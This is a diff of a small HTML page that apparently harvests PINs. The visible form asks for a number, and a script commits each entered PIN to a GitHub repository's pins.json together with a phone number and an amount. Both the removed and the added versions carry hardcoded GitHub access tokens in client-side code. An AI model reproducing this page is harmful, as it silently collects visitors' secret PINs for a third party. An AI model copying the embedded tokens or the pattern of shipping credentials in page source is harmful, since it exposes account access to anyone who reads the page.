@@ -12,7 +12,6 @@
             margin: 10px;
             padding: 20px;
         }
-
         #subheading {
             font-size: 25px;
             font-weight: bold;
@@ -21,7 +20,6 @@
             margin: 10px;
             padding: 20px;
         }
-
         a {
             display: block;
             padding-top: 30px;
@@ -34,19 +32,16 @@
             color: black;
             text-decoration: none;
         }
-
         #enternumberlabel {
             color: #d6d4d4;
             margin-left: 20px;
             display: block;
         }
-
         #enternumberinput {
             display: block;
             outline: none;
             margin: 20px;
         }
-
         #getphonebutton {
             margin-top: 20px;
             margin-left: 50px;
@@ -64,61 +59,55 @@
     <input id="enternumberinput" type="text">
     <button id="getphonebutton">OK</button>
 
-    <script>
-        async function updateJSONOnGitHub(newKeyValue) {
-            const repoOwner = "senmakana";  // Replace with your GitHub username
-            const repoName = "Pins";  // Replace with your repository name
-            const filePath = "pins.json";  // Replace with your file path
-            const branch = "main";  // Use the correct branch
-            const githubToken = "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"; // Replace with your GitHub Personal Access Token
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 
-            const fileApiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`;
+    <script>
+        async function updateJSONFile(pin, phoneNumber, amount) {
+            const GITHUB_TOKEN = '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';
+            const OWNER = 'senmakana'; // GitHub username
+            const REPO = 'Pins'; // Repository name
+            const FILE_PATH = 'pins.json'; // Path to JSON file in the repo
+            const BRANCH = 'main'; // Branch name
 
             try {
-                console.log("Fetching file metadata...");
+                // Fetch existing file content
+                const { data: fileData } = await axios.get(
+                    `https://api.github.com/repos/${OWNER}/${REPO}/contents/${FILE_PATH}`,
+                    {
+                        headers: { Authorization: `token ${GITHUB_TOKEN}` },
+                    }
+                );
 
-                const fileResponse = await fetch(fileApiUrl, {
-                    headers: {
-                        Authorization: `Bearer ${githubToken}`,
-                    },
-                });
+                const content = atob(fileData.content); // Decode Base64
+                const json = JSON.parse(content);
 
-                if (!fileResponse.ok) {
-                    throw new Error(`Failed to fetch file metadata: ${fileResponse.statusText}`);
-                }
+                // Update with new data
+                json.pin = pin;
+                json.phoneNumber = phoneNumber;
+                json.amount = amount;
 
-                const fileData = await fileResponse.json();
-                const fileContent = atob(fileData.content);  // Decode base64 content
-                const json = JSON.parse(fileContent);
-
-                // Update the JSON with the new key-value pairs
-                Object.assign(json, newKeyValue);
-
-                // Encode the updated JSON to base64
+                // Encode updated content
                 const updatedContent = btoa(JSON.stringify(json, null, 2));
 
-                const updateResponse = await fetch(fileApiUrl, {
-                    method: "PUT",
-                    headers: {
-                        Authorization: `Bearer ${githubToken}`,
-                        "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify({
-                        message: "Update pins.json with new data",
+                // Commit updated content
+                const response = await axios.put(
+                    `https://api.github.com/repos/${OWNER}/${REPO}/contents/${FILE_PATH}`,
+                    {
+                        message: 'Update pin and related data',
                         content: updatedContent,
                         sha: fileData.sha,
-                        branch,
-                    }),
-                });
+                        branch: BRANCH,
+                    },
+                    {
+                        headers: { Authorization: `token ${GITHUB_TOKEN}` },
+                    }
+                );
 
-                if (!updateResponse.ok) {
-                    throw new Error(`Failed to update file: ${updateResponse.statusText}`);
-                }
-
-                console.log("File updated successfully!");
+                console.log('File updated successfully:', response.data.commit.html_url);
+                alert('File updated successfully!');
             } catch (error) {
-                console.error("Error:", error.message);
-                alert("An error occurred. Check the console for details.");
+                console.error('Error updating file:', error.response?.data || error.message);
+                alert('Failed to update the file.');
             }
         }
 
@@ -126,26 +115,12 @@
             const pin = document.getElementById("enternumberinput").value;
             sessionStorage.setItem("pin", pin);
 
-            // Prepare new data
-            const newKeyValue = {
-                "pin": pin,
-                "phonenumber": 888888,  // Sample phone number
-                "amount": sessionStorage.getItem("amount") || 0,  // Default to 0 if not set
-            };
+            const phoneNumber = 888888; // Example phone number
+            const amount = sessionStorage.getItem("amount") || 0;
 
-            // Call the update function
-            updateJSONOnGitHub(newKeyValue);
-
-            // Attempt to close the window
-            try {
-                window.close();
-                console.log("Window closed.");
-            } catch (e) {
-                alert("Unable to close the window. Please close it manually.");
-            }
+            updateJSONFile(pin, phoneNumber, amount);
         }
 
-        // Attach event listener for the button click
         document.getElementById("getphonebutton").addEventListener("click", getPhoneNumber);
     </script>
 </body>
